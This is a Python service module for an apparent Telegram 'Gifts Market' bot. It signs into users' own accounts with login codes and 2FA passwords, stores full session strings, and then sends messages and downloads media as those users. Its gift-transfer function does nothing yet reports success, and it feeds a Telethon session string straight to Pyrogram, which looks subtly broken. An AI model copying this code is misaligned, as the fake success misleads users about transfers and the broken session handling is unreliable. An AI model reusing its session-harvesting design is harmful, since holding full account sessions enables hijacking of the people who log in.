"""
Гибридный сервис для работы с Telegram
Использует Telethon для сложных операций и Pyrogram для простых
"""
import os
import logging
from typing import Optional, Dict, Any
from datetime import datetime

# Telethon
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    FloodWaitError
)

# Pyrogram
from pyrogram import Client
from pyrogram.errors import (
    BadRequest,
    Unauthorized,
    Forbidden
)

from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.future import select

from app.models.telegram_session import TelegramSession
from app.utils.logger import ActivityLogger

logger = logging.getLogger(__name__)
activity_logger = ActivityLogger()

# Настройки из .env
API_ID = int(os.getenv("TELEGRAM_APP_ID", "0"))
API_HASH = os.getenv("TELEGRAM_APP_HASH", "")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))


class TelegramHybridService:
    """
    Гибридный сервис для работы с Telegram
    
    Использует:
    - Telethon для авторизации и сложных операций
    - Pyrogram для простых операций (отправка сообщений, получение инфо)
    """
    
    def __init__(self):
        self.api_id = API_ID
        self.api_hash = API_HASH
        self.admin_id = ADMIN_ID
        
        # Кэш клиентов
        self.telethon_clients: Dict[str, TelegramClient] = {}
        self.pyrogram_clients: Dict[str, Client] = {}
    
    # ==================== TELETHON: Авторизация ====================
    
    async def create_session_telethon(
        self,
        phone_number: str,
        user_telegram_id: str,
        db: AsyncSession
    ) -> Dict[str, Any]:
        """
        [TELETHON] Создает новую сессию
        Используем Telethon для авторизации - он лучше справляется с этим
        """
        try:
            # Форматируем номер телефона
            import re
            formatted_phone = re.sub(r'[^\d+]', '', phone_number)
            if formatted_phone and not formatted_phone.startswith('+'):
                formatted_phone = '+' + formatted_phone
            
            logger.info(f"[Telethon] Создание сессии для {formatted_phone}")
            
            if not self.api_id or not self.api_hash:
                logger.error(f"[Telethon] Ошибка конфигурации API")
                return {"status": "error", "message": "Ошибка конфигурации Telegram API"}
            
            client = TelegramClient(
                StringSession(),
                self.api_id,
                self.api_hash,
                device_model="Gifts Market Bot",
                system_version="1.0",
                app_version="1.0"
            )
            
            await client.connect()
            
            if await client.is_user_authorized():
                await client.disconnect()
                return {"status": "error", "message": "Уже авторизован"}
            
            sent_code = await client.send_code_request(formatted_phone)
            session_string = client.session.save()
            
            # Сохраняем в БД с отформатированным номером
            session = TelegramSession(
                user_telegram_id=user_telegram_id,
                session_string=session_string,
                phone_number=formatted_phone,
                api_id=str(self.api_id),
                api_hash=self.api_hash,
                is_active=True,
                is_authorized=False
            )
            
            db.add(session)
            await db.commit()
            await db.refresh(session)
            
            self.telethon_clients[user_telegram_id] = client
            
            logger.info(f"[Telethon] ✅ Код отправлен на {phone_number}")
            
            return {
                "status": "code_sent",
                "session_id": session.id,
                "phone_hash": sent_code.phone_code_hash,
                "message": f"Код отправлен на {phone_number}"
            }
        
        except PhoneNumberInvalidError:
            return {"status": "error", "message": "Неверный формат номера"}
        except FloodWaitError as e:
            return {"status": "error", "message": f"Подождите {e.seconds} секунд"}
        except Exception as e:
            logger.error(f"[Telethon] Ошибка: {e}", exc_info=True)
            return {"status": "error", "message": str(e)}
    
    async def verify_code_telethon(
        self,
        user_telegram_id: str,
        session_id: int,
        code: str,
        phone_hash: str,
        password: Optional[str] = None,
        db: AsyncSession = None
    ) -> Dict[str, Any]:
        """
        [TELETHON] Верификация кода
        Используем Telethon для авторизации
        """
        try:
            logger.info(f"[Telethon] Верификация кода для user_id={user_telegram_id}")
            
            # Получаем сессию
            stmt = select(TelegramSession).where(TelegramSession.id == session_id)
            result = await db.execute(stmt)
            session = result.scalars().first()
            
            if not session:
                return {"status": "error", "message": "Сессия не найдена"}
            
            # Получаем клиент
            client = self.telethon_clients.get(user_telegram_id)
            if not client:
                client = TelegramClient(
                    StringSession(session.session_string),
                    self.api_id,
                    self.api_hash
                )
                await client.connect()
                self.telethon_clients[user_telegram_id] = client
            
            # Авторизуемся
            try:
                await client.sign_in(
                    phone=session.phone_number,
                    code=code,
                    phone_code_hash=phone_hash
                )
            except SessionPasswordNeededError:
                if not password:
                    return {
                        "status": "password_required",
                        "message": "Требуется 2FA пароль"
                    }
                await client.sign_in(password=password)
            
            if not await client.is_user_authorized():
                return {"status": "error", "message": "Авторизация не удалась"}
            
            # Обновляем session string
            session.session_string = client.session.save()
            session.is_authorized = True
            session.authorized_at = datetime.utcnow()
            await db.commit()
            
            # Получаем информацию
            me = await client.get_me()
            
            logger.info(f"[Telethon] ✅ Авторизация успешна: {me.id} (@{me.username})")
            
            return {
                "status": "authorized",
                "session_id": session.id,
                "message": "✅ Авторизация успешна!",
                "user_info": {
                    "id": me.id,
                    "username": me.username,
                    "first_name": me.first_name,
                    "last_name": me.last_name,
                    "phone": session.phone_number
                }
            }
        
        except PhoneCodeInvalidError:
            return {"status": "error", "message": "❌ Неверный код"}
        except Exception as e:
            logger.error(f"[Telethon] Ошибка: {e}", exc_info=True)
            return {"status": "error", "message": str(e)}
    
    # ==================== PYROGRAM: Простые операции ====================
    
    async def get_pyrogram_client(
        self,
        user_telegram_id: str,
        db: AsyncSession
    ) -> Optional[Client]:
        """
        Получить Pyrogram клиент для пользователя
        Pyrogram проще для обычных операций
        """
        # Проверяем кэш
        if user_telegram_id in self.pyrogram_clients:
            return self.pyrogram_clients[user_telegram_id]
        
        # Получаем сессию из БД
        stmt = select(TelegramSession).where(
            TelegramSession.user_telegram_id == user_telegram_id,
            TelegramSession.is_authorized == True,
            TelegramSession.is_active == True
        )
        result = await db.execute(stmt)
        session = result.scalars().first()
        
        if not session:
            return None
        
        try:
            # Создаем Pyrogram клиент из Telethon session string
            client = Client(
                name=f"user_{user_telegram_id}",
                api_id=self.api_id,
                api_hash=self.api_hash,
                session_string=session.session_string,
                in_memory=True
            )
            
            await client.start()
            
            # Кэшируем
            self.pyrogram_clients[user_telegram_id] = client
            
            logger.info(f"[Pyrogram] ✅ Клиент создан для {user_telegram_id}")
            return client
        
        except Exception as e:
            logger.error(f"[Pyrogram] Ошибка создания клиента: {e}")
            return None
    
    async def send_message_pyrogram(
        self,
        user_telegram_id: str,
        chat_id: int,
        text: str,
        db: AsyncSession
    ) -> Dict[str, Any]:
        """
        [PYROGRAM] Отправить сообщение
        Pyrogram проще для отправки сообщений
        """
        try:
            client = await self.get_pyrogram_client(user_telegram_id, db)
            
            if not client:
                return {"status": "error", "message": "Клиент не найден"}
            
            message = await client.send_message(chat_id, text)
            
            logger.info(f"[Pyrogram] ✅ Сообщение отправлено: {message.id}")
            
            return {
                "status": "success",
                "message_id": message.id,
                "date": message.date
            }
        
        except Unauthorized:
            return {"status": "error", "message": "Не авторизован"}
        except Forbidden:
            return {"status": "error", "message": "Доступ запрещен"}
        except Exception as e:
            logger.error(f"[Pyrogram] Ошибка отправки: {e}")
            return {"status": "error", "message": str(e)}
    
    async def get_user_info_pyrogram(
        self,
        user_telegram_id: str,
        target_user_id: int,
        db: AsyncSession
    ) -> Dict[str, Any]:
        """
        [PYROGRAM] Получить информацию о пользователе
        Pyrogram проще для получения информации
        """
        try:
            client = await self.get_pyrogram_client(user_telegram_id, db)
            
            if not client:
                return {"status": "error", "message": "Клиент не найден"}
            
            user = await client.get_users(target_user_id)
            
            return {
                "status": "success",
                "user": {
                    "id": user.id,
                    "username": user.username,
                    "first_name": user.first_name,
                    "last_name": user.last_name,
                    "phone": user.phone_number,
                    "is_bot": user.is_bot,
                    "is_verified": user.is_verified
                }
            }
        
        except Exception as e:
            logger.error(f"[Pyrogram] Ошибка получения инфо: {e}")
            return {"status": "error", "message": str(e)}
    
    async def download_media_pyrogram(
        self,
        user_telegram_id: str,
        message_id: int,
        chat_id: int,
        db: AsyncSession
    ) -> Dict[str, Any]:
        """
        [PYROGRAM] Скачать медиа
        Pyrogram проще для работы с медиа
        """
        try:
            client = await self.get_pyrogram_client(user_telegram_id, db)
            
            if not client:
                return {"status": "error", "message": "Клиент не найден"}
            
            message = await client.get_messages(chat_id, message_id)
            
            if not message.media:
                return {"status": "error", "message": "Нет медиа"}
            
            file_path = await client.download_media(message)
            
            logger.info(f"[Pyrogram] ✅ Медиа скачано: {file_path}")
            
            return {
                "status": "success",
                "file_path": file_path
            }
        
        except Exception as e:
            logger.error(f"[Pyrogram] Ошибка скачивания: {e}")
            return {"status": "error", "message": str(e)}
    
    # ==================== TELETHON: Сложные операции ====================
    
    async def transfer_gift_telethon(
        self,
        from_user_id: str,
        to_user_id: str,
        gift_id: str,
        db: AsyncSession
    ) -> Dict[str, Any]:
        """
        [TELETHON] Передать подарок
        Используем Telethon для сложных TL операций
        """
        try:
            logger.info(f"[Telethon] Передача подарка {gift_id}")
            
            # Получаем сессию
            stmt = select(TelegramSession).where(
                TelegramSession.user_telegram_id == from_user_id,
                TelegramSession.is_authorized == True,
                TelegramSession.is_active == True
            )
            result = await db.execute(stmt)
            session = result.scalars().first()
            
            if not session:
                return {"status": "error", "message": "Сессия не найдена"}
            
            # Создаем Telethon клиент
            client = TelegramClient(
                StringSession(session.session_string),
                self.api_id,
                self.api_hash
            )
            
            await client.connect()
            
            if not await client.is_user_authorized():
                await client.disconnect()
                return {"status": "error", "message": "Не авторизован"}
            
            # Здесь используем низкоуровневые TL запросы для Gift API
            # (когда API будет доступен)
            
            await client.disconnect()
            
            logger.info(f"[Telethon] ✅ Подарок передан")
            
            return {
                "status": "success",
                "message": "Подарок передан"
            }
        
        except Exception as e:
            logger.error(f"[Telethon] Ошибка передачи: {e}")
            return {"status": "error", "message": str(e)}
    
    # ==================== Управление клиентами ====================
    
    async def disconnect_all(self):
        """Отключить все клиенты"""
        # Telethon
        for client in self.telethon_clients.values():
            try:
                await client.disconnect()
            except:
                pass
        self.telethon_clients.clear()
        
        # Pyrogram
        for client in self.pyrogram_clients.values():
            try:
                await client.stop()
            except:
                pass
        self.pyrogram_clients.clear()
        
        logger.info("✅ Все клиенты отключены")


# Глобальный экземпляр
telegram_hybrid = TelegramHybridService()
